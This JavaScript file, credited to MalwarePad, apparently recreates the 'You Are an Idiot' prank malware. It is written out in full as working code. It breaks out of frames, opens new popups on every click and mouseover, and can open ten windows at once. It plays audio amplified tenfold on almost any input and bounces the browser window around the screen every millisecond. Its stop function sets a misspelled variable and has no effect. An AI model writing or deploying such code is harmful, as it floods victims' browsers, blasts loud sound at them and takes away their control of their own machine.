/* 
    * Written by MalwarePad https://malwarepad.com
*/

if (top.location != location) {
  top.location.href = location.href;
}
function reopen() {
  window.open(
    "popup.html",
    "",
    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
  );
}
function spam() {
  for (var i = 0; i < 10; i++) {
    reopen();
  }
  return "You are an idiot!";
}
var audioBoostApplied = false;
function boostAudio() {
  var audio = document.getElementById("idiot-audio");
  if (!audio) return;
  audio.muted = false;
  audio.volume = 1.0;
  if (audioBoostApplied) {
    audio.play().catch(function () {});
    return;
  }
  audioBoostApplied = true;
  var AudioContextCtor = window.AudioContext || window.webkitAudioContext;
  if (AudioContextCtor) {
    var audioCtx = new AudioContextCtor();
    var source = audioCtx.createMediaElementSource(audio);
    var gainNode = audioCtx.createGain();
    gainNode.gain.value = 10.0;
    source.connect(gainNode);
    gainNode.connect(audioCtx.destination);
    if (audioCtx.state === "suspended") {
      audioCtx.resume().catch(function () {});
    }
  }
  audio.play().catch(function () {});
}
function init() {
  document.body.onclick = function () {
    reopen();
    boostAudio();
  };
  document.body.onmouseover = function () {
    reopen();
    boostAudio();
  };
  document.body.onmousemove = function () {
    boostAudio();
  };
  document.body.onpointerdown = function () {
    boostAudio();
  };
  document.body.ontouchstart = function () {
    boostAudio();
  };
  document.body.onkeydown = function () {
    boostAudio();
  };
  boostAudio();
  playBall();
  if (typeof window.bookmark === "function") {
    window.bookmark();
  }
  reopen();
  setTimeout(function () {
    window.close();
  }, 10000);
}
var xOff = 5,
  yOff = 5,
  xPos = 400,
  yPos = -100,
  flagRun = true;
function newXlt() {
  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}
function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function newYup() {
  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
}
function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function fOff() {
  flagrun = false;
}
function playBall() {
  xPos += xOff;
  yPos += yOff;
  if (xPos > screen.width - 175) {
    newXlt();
  }
  if (xPos < 0) {
    newXrt();
  }
  if (yPos > screen.height - 100) {
    newYup();
  }
  if (yPos < 0) {
    newYdn();
  }
  if (flagRun) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 1);
  }
}
